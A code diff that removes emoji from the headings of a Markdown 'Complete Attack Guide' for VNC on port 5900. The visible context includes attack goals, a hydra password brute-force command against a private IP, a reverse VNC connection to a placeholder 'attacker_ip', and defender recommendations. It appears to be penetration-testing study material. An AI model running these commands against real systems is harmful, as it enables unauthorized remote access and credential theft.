@@ -1,6 +1,6 @@
 # Port 5900 - VNC (Virtual Network Computing) - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: VNC (Virtual Network Computing)
 **Ports**: 5900 (VNC), 5901-5909 (Additional displays), 5800 (VNC over HTTP)
@@ -8,7 +8,7 @@
 **Encryption**: None (by default), can tunnel through SSH
 **Authentication**: Password, None (if misconfigured)
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **No Authentication Bypass**: Access VNC without password
 - **Password Brute Force**: Crack VNC passwords
@@ -17,7 +17,7 @@
 - **Credential Theft**: Steal passwords entered by user
 - **Man-in-the-Middle**: Intercept VNC traffic
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Reconnaissance
 
@@ -335,7 +335,7 @@ vncviewer -listen 5500
 vncviewer -connect attacker_ip:5500
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing Authentication
 
@@ -381,7 +381,7 @@ firefox http://192.168.1.100:5800
 hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 10
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 **What to Look For**:
 ```bash
@@ -395,7 +395,7 @@ hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 10
 # Credentials in files
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Strong Passwords** - Use complex VNC passwords
@@ -409,7 +409,7 @@ hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 10
 9. **Encrypted VNC** - Use VNC variants with encryption
 10. **Monitor Connections** - Log all VNC access
 
-## ⚠️ Common Mistakes
+## Common Mistakes
 
 **Attacker Mistakes**:
 1. Too aggressive brute force - Triggers lockout
@@ -425,7 +425,7 @@ hydra -P passwords.txt vnc://192.168.1.100 -t 1 -w 10
 5. Old VNC versions - Known exploits
 6. No logging - Can't detect attacks
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Discovery
@@ -465,7 +465,7 @@ vncviewer 192.168.1.50:5900
 # Full system compromise!
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **Discovery**: Nmap
@@ -475,7 +475,7 @@ vncviewer 192.168.1.50:5900
 - **Password Cracking**: vncpwd, John
 - **MITM**: Ettercap, Wireshark
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 3389 (RDP)**: Similar remote desktop
 - **Port 22 (SSH)**: Tunnel VNC over SSH
